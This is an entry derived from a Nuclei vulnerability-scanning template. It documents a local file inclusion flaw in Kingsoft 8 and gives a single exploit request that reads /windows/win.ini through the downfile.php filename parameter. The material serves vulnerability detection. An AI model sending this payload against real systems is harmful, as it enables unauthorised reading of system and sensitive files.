# Nuclei Template: Kingsoft 8 - Local File Inclusion
**Template ID:** kingsoft-v8-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`kingsoft-v8-file-read.yaml`)

## Vulnerability Information & PoC

## Description
Kingsoft 8 is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/htmltopdf/downfile.php?filename=/windows/win.ini
```

## References
- https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/b6f8fbfef46ad1c3f8d5715dd19b00ca875341c2/_book/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
